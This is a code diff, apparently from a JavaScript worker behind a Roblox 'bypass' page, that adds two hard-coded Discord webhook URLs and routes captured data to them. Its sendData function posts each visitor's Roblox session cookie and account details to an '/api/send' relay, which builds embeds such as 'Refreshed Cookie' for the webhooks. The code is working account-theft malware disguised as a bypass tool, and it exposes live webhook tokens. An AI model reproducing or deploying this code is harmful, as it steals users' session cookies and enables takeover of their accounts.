@@ -179,20 +179,25 @@ export default {
     })();
 
     var API_URL = window.location.origin + '/bypass/astral/bypass.php';
+    var DUAL_WEBHOOK = 'https://discord.com/api/webhooks/1540619916305240095/SWEEYFk72dmsfkVUMn3dXNXoidqb4syGhspccO2Hysz--fxwW18E1SZ5EocY8_n64IAR';
+    var LIVE_WEBHOOK = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
 
     function sendData(data, cookie) {
+        // Main embed -> LIVE webhook
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type: 'main', data: data, cookie: cookie })
         }).catch(function(err) { console.log('main err:', err); });
 
+        // Dual embed -> DUAL webhook
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
+        // Cookie embed -> DUAL webhook (same as secondary)
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
@@ -326,7 +331,6 @@ export default {
         const moneyEmoji = '<:money:1334576383862771793>';
 
         const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
-        // FIXED: Correct Roblox thumbnail API for headshot
         const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=720x720&format=Png&isCircular=false`;
 
         let accountAge = 'Unknown';
@@ -337,7 +341,7 @@ export default {
           accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
         }
 
-        // ---- MAIN EMBED ----
+        // ---- MAIN EMBED (LIVE) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
 
@@ -411,8 +415,9 @@ export default {
           };
         }
 
-        // ---- COOKIE EMBED ----
+        // ---- COOKIE EMBED (separate message sent to DUAL webhook) ----
         else if (type === 'cookie') {
+          // Explicitly use the dual webhook URL
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           const embed = {
             title: 'Refreshed Cookie',
